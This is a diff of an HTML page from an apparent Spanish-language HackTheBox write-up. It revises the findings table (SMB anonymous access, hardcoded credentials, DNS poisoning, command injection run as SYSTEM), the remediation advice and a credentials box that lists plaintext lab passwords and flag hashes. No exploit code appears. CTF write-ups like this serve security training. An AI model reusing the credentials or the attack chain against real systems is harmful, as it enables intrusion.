-    root.txt → <span class="cred-pass">9a6ea3cdd5e3235b48224790b62790c2</span>
-  </div>
-</section>
+    <!-- FINDINGS -->
+    <section class="section" id="findings">
+      <div class="section-label">10 — Findings</div>
+      <h2>Hallazgos Técnicos</h2>
+      <table class="findings-table">
+        <thead>
+          <tr>
+            <th>#</th><th>Severidad</th><th>Hallazgo</th><th>CVSS 3.1</th><th>CWE</th><th>MITRE</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td>F-01</td>
+            <td><span class="severity sev-high">High</span></td>
+            <td>SMB anónimo — lectura sin autenticación del share software$</td>
+            <td>7.5</td><td>CWE-284</td><td>T1135, T1083</td>
+          </tr>
+          <tr>
+            <td>F-02</td>
+            <td><span class="severity sev-high">High</span></td>
+            <td>Credenciales hardcodeadas en overwatch.exe (sqlsvc)</td>
+            <td>8.8</td><td>CWE-798</td><td>T1552.001, T1078.002</td>
+          </tr>
+          <tr>
+            <td>F-03</td>
+            <td><span class="severity sev-high">High</span></td>
+            <td>Permisos WRITE DNS en AD para cuenta de servicio sqlsvc</td>
+            <td>8.1</td><td>CWE-269</td><td>T1584.002, T1557</td>
+          </tr>
+          <tr>
+            <td>F-04</td>
+            <td><span class="severity sev-high">High</span></td>
+            <td>Linked server MSSQL con auth en texto claro (SQL07)</td>
+            <td>8.8</td><td>CWE-312</td><td>T1557, T1040</td>
+          </tr>
+          <tr>
+            <td>F-05</td>
+            <td><span class="severity sev-critical">Critical</span></td>
+            <td>OS Command Injection en WCF KillProcess() ejecutando como SYSTEM</td>
+            <td>9.8</td><td>CWE-78</td><td>T1059.001, T1543.003</td>
+          </tr>
+          <tr>
+            <td>F-06</td>
+            <td><span class="severity sev-medium">Medium</span></td>
+            <td>Linked server MSSQL sin resolver (SQL07) — superficie de ataque DNS</td>
+            <td>—</td><td>—</td><td>T1557</td>
+          </tr>
+          <tr>
+            <td>F-07</td>
+            <td><span class="severity sev-info">Info</span></td>
+            <td>Sin actividad de detección/respuesta durante todo el engagement</td>
+            <td>—</td><td>CWE-693</td><td>—</td>
+          </tr>
+        </tbody>
+      </table>
+    </section>
 
-<!-- REMEDIATION -->
-<section class="section" id="remediation">
-  <div class="section-label">06 — Remediation</div>
-  <h2>Resumen de Remediación</h2>
-  <ul>
-    <li><strong>[Inmediata]</strong> Rotar contraseñas sqlsvc y sqlmgmt inmediatamente</li>
-    <li><strong>[Inmediata]</strong> Parchear KillProcess() — validar input con whitelist alfanumérica; usar <code>System.Diagnostics.Process.Kill()</code> en lugar de concatenación PowerShell</li>
-    <li><strong>[Corto plazo]</strong> Deshabilitar acceso SMB anónimo/invitado; requerir autenticación para todos los shares; eliminar binarios compilados y archivos PDB de recursos de red</li>
-    <li><strong>[Corto plazo]</strong> Eliminar permisos WRITE DNS de sqlsvc en AD; monitorizar cambios DNS con Event ID 5137</li>
-    <li><strong>[Corto plazo]</strong> Habilitar cifrado TLS en todos los servidores enlazados MSSQL (Force Encryption = Yes); usar Kerberos en lugar de texto claro</li>
-    <li><strong>[Corto plazo]</strong> Ejecutar el servicio overwatch.exe bajo una cuenta de mínimo privilegio, no como SYSTEM; restringir acceso de red al puerto 8000</li>
-    <li><strong>[Medio plazo]</strong> Nunca incrustar credenciales en código compilado — usar Windows Credential Manager, DPAPI o HashiCorp Vault; implementar pipeline de escaneo de secretos en CI/CD</li>
-    <li><strong>[Medio plazo]</strong> Desplegar SIEM + Sysmon para detección: Event ID 5137 (DNS), 4662 (AD WRITE), Sysmon Event 3 (conexiones salientes MSSQL)</li>
-  </ul>
-</section>
+    <!-- CREDS -->
+    <section class="section" id="creds">
+      <div class="section-label">11 — Credentials & Flags</div>
+      <h2>Credenciales Obtenidas</h2>
+      <div class="creds-box">
+        <span class="cred-label"># sqlsvc — Hardcodeada en CheckEdgeHistory() de overwatch.exe</span><br>
+        <span class="cred-user">sqlsvc</span> : <span class="cred-pass">TI0LKcfHzZw1Vv</span>  <span class="cred-label">← MSSQL port 6520, Windows Auth</span><br><br>
+        <span class="cred-label"># sqlmgmt — Capturada en texto claro por Responder vía DNS poisoning</span><br>
+        <span class="cred-user">sqlmgmt</span> : <span class="cred-pass">bIhBbzMMnB82yx</span>  <span class="cred-label">← WinRM 5985</span>
+      </div>
+      <div class="creds-box">
+        <span class="cred-label"># Flags</span><br>
+        user.txt  <span class="cred-label">C:\Users\sqlmgmt\Desktop\user.txt</span><br>
+        → <span class="cred-pass">62a1f3fb06c2c857cf2fefabcada7c40</span><br><br>
+        root.txt  <span class="cred-label">C:\Users\Administrator\Desktop\root.txt</span><br>
+        → <span class="cred-pass">9a6ea3cdd5e3235b48224790b62790c2</span>
+      </div>
+    </section>
 
-<!-- TOOLS -->
-<section class="section" id="tools">
-  <div class="section-label">07 — Tools</div>
-  <h2>Herramientas Utilizadas</h2>
-  <ul>
-    <li><strong>Nmap 7.95</strong> — Escaneo de puertos y detección de versiones de servicios</li>
-    <li><strong>smbclient</strong> — Enumeración de recursos SMB anónimos y recuperación de archivos</li>
-    <li><strong>dnSpy 6.1.8</strong> — Descompilación de binarios .NET y extracción de credenciales</li>
-    <li><strong>Impacket mssqlclient.py</strong> — Acceso autenticado a MSSQL</li>
-    <li><strong>BloodyAD</strong> — Auditoría de permisos AD e inyección de registros DNS</li>
-    <li><strong>Responder 3.1.7</strong> — Captura de credenciales MSSQL en texto claro</li>
-    <li><strong>Evil-WinRM 3.9</strong> — Acceso mediante shell WinRM</li>
-    <li><strong>New-WebServiceProxy</strong> — Interacción con servicio SOAP WCF y entrega de payload</li>
-    <li><strong>nc / python3</strong> — Listener de reverse shell y servidor HTTP</li>
-  </ul>
-  <div class="tag-row">
-    <span class="tag">Active Directory</span>
-    <span class="tag">SMB Anonymous</span>
-    <span class="tag">.NET Reverse Engineering</span>
-    <span class="tag">DNS Poisoning</span>
-    <span class="tag">Responder</span>
-    <span class="tag">MSSQL Linked Server</span>
-    <span class="tag">WCF Injection</span>
-    <span class="tag">PowerShell</span>
-    <span class="tag">HackTheBox</span>
-    <span class="tag">T1135</span>
-    <span class="tag">T1552.001</span>
-    <span class="tag">T1584.002</span>
-    <span class="tag">T1059.001</span>
-  </div>
-</section>
+    <!-- REMEDIATION -->
+    <section class="section" id="remediation">
+      <div class="section-label">12 — Remediation</div>
+      <h2>Resumen de Remediación</h2>
+      <ul>
+        <li><strong>[Inmediata]</strong> Rotar contraseñas de <code>sqlsvc</code> y <code>sqlmgmt</code> inmediatamente. Revisar si están reutilizadas en otros sistemas.</li>
+        <li><strong>[Inmediata]</strong> Parchear <code>KillProcess()</code> en overwatch.exe: reemplazar concatenación de strings PowerShell por <code>System.Diagnostics.Process.Kill()</code>. Validar input con whitelist alfanumérica estricta.</li>
+        <li><strong>[Inmediata]</strong> Cambiar el usuario de ejecución de overwatch.exe de SYSTEM a una cuenta de servicio con mínimo privilegio. Restringir el acceso de red al puerto 8000 solo a hosts de gestión.</li>
+        <li><strong>[Corto plazo]</strong> Deshabilitar acceso SMB anónimo/invitado. Requerir autenticación para todos los shares. Eliminar binarios compilados, PDB y dependencias de recursos de red — usar despliegue versionado en lugar de shares abiertos.</li>
+        <li><strong>[Corto plazo]</strong> Eliminar permisos WRITE DNS de <code>sqlsvc</code> en AD. Aplicar segmentación por niveles (Tier Model): las cuentas de servicio de aplicación no deben tener acceso a objetos de infraestructura. Monitorizar cambios DNS en AD (Event ID 5137).</li>
+        <li><strong>[Corto plazo]</strong> Habilitar cifrado TLS obligatorio para todos los linked servers MSSQL (<code>Force Encryption = Yes</code>). Migrar autenticación a Kerberos en lugar de SQL auth. Limpiar linked servers obsoletos.</li>
+        <li><strong>[Medio plazo]</strong> Implementar pipeline de escaneo de secretos en CI/CD para detectar credenciales hardcodeadas antes de compilar. Usar Windows Credential Manager, DPAPI o HashiCorp Vault para secretos de aplicación.</li>
+        <li><strong>[Medio plazo]</strong> Desplegar SIEM + Sysmon: alertas en Event ID 5137 (DNS changes), 4662 (AD object WRITE), Sysmon Event 3 (conexiones MSSQL salientes inesperadas).</li>
+      </ul>
+      <div class="tag-row">
+        <span class="tag">Active Directory</span>
+        <span class="tag">SMB Anonymous</span>
+        <span class="tag">.NET Reverse Engineering</span>
+        <span class="tag">dnSpy</span>
+        <span class="tag">MSSQL Linked Server</span>
+        <span class="tag">DNS Poisoning</span>
+        <span class="tag">BloodyAD</span>
+        <span class="tag">Responder</span>
+        <span class="tag">WCF Injection</span>
+        <span class="tag">PowerShell</span>
+        <span class="tag">HackTheBox</span>
+        <span class="tag">T1135</span>
+        <span class="tag">T1552.001</span>
+        <span class="tag">T1584.002</span>
+        <span class="tag">T1557</span>
+        <span class="tag">T1059.001</span>
+      </div>
 
-<!-- BOTTOM NAV -->
-<div class="writeup-nav-bottom">
-  <a class="nav-link-btn prev-page" href="spookysec.html">← Anterior: Spookysec THM</a>
-  <a class="nav-link-btn" href="../index.html">Volver al inicio →</a>
-</div>
-```
+      <div class="writeup-nav-bottom">
+        <a class="nav-link-btn prev-page" href="spookysec.html">← Anterior: Spookysec THM</a>
+        <a class="nav-link-btn" href="index.html">Volver al inicio →</a>
+      </div>
+    </section>
 
   </main>
 </div>
 
-<footer>
-  OJM.SEC · Oriol Jaen Mirabet · Security Research &amp; Writeups
-</footer>
+<footer>OJM.SEC · Oriol Jaen Mirabet · Security Research &amp; Writeups</footer>
 
 <script>
 const sections = document.querySelectorAll('.section');
@@ -587,9 +804,8 @@ const observer = new IntersectionObserver(entries => {
       if (active) active.classList.add('active');
     }
   });
-}, { rootMargin: '-30% 0px -60% 0px' });
+}, { rootMargin: '-20% 0px -70% 0px' });
 sections.forEach(s => observer.observe(s));
 </script>
-
 </body>
 </html>
